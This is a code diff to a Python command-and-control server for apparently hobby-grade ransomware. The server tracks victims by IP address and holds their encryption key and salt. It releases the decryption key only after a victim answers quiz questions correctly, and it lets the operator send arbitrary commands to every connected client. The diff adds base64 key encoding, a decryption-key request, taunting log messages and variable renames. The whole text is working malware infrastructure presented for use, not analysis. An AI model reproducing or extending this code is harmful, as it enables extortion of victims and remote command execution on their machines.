@@ -24,6 +24,7 @@ class Requests(enum.Enum):
     CHECK_ANSWERS = "CHECK_ANSWERS"
     ANSWER_VERIFICATION = "ANSWER_VERIFICATION"
     NOT_ENOUGH_CORRECT_ANSWERS = "NOT_ENOUGH_CORRECT_ANSWERS"
+    REQUEST_DECRYPTION_KEY = "REQUEST_DECRYPTION_KEY"
     EXIT = "EXIT"
 # dictionary containing IP addresses of victims and their correct answers count
 VICTIM_CORRECT_ANSWERS_COUNTER = {}
@@ -66,15 +67,22 @@ def handle_client(client_socket: socket, key: bytes, salt: bytes):
                 break
             print(f"Received request from {client_socket.getpeername()}: {request}")
             if request.startswith(Requests.CHECK_ANSWERS.value):
+                print("Received a request to check an answer")
                 _, question, answer = request.split(":", 2)
                 response = verify_answers(question, answer, client_socket.getpeername())
                 client_socket.send(f"ANSWER_VERIFICATION:{response}".encode())
             elif request.startswith(Requests.ENCRYPT.value):
-                client_socket.send(key + b"::" + salt)
+                print("Someone clicked the wrong button :D")
+                payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
+                client_socket.send(payload)
             elif request.startswith(Requests.REQUEST_DECRYPTION_KEY.value):
+                print("Received request for decryption key")
                 if VICTIM_CORRECT_ANSWERS_COUNTER.get(client_socket.getpeername(), 0) >= len(QUESTIONS):
-                    client_socket.send(key + b"::" + salt)
+                    print("Sending the decryption key")
+                    payload = base64.b64encode(key) + b"::" + base64.b64encode(salt)
+                    client_socket.send(payload)
                 else:
+                    print("Someone tried to request the decryption key without completing the minigame")
                     client_socket.send(Requests.NOT_ENOUGH_CORRECT_ANSWERS.value.encode())
             elif request.startswith(Requests.EXIT.value):
                 print(f"Client {client_socket.getpeername()} requested to exit. (His loss :D)")
@@ -93,17 +101,17 @@ def execute_command(command: str):
         client.send(command.encode())
 
 def instruction_handler():
-    intput = input("Enter command to execute on clients: ")
-    while intput.lower() != "exit":
-        execute_command(intput)
-        intput = input("Enter command to execute on clients: ")
+    user_input = input("Enter command to execute on clients: ")
+    while user_input.lower() != "exit":
+        execute_command(user_input)
+        user_input = input("Enter command to execute on clients: ")
 
 def main():
     print("Starting C2 server...")
 
     #generate encryption key
-    input = input("Enter encryption password for the victims: ")
-    key, salt = generate_key_from_password(input)
+    user_input = input("Enter encryption password for the victims: ")
+    key, salt = generate_key_from_password(user_input)
 
     instruction_handler_thread = threading.Thread(target=instruction_handler)
     instruction_handler_thread.start()
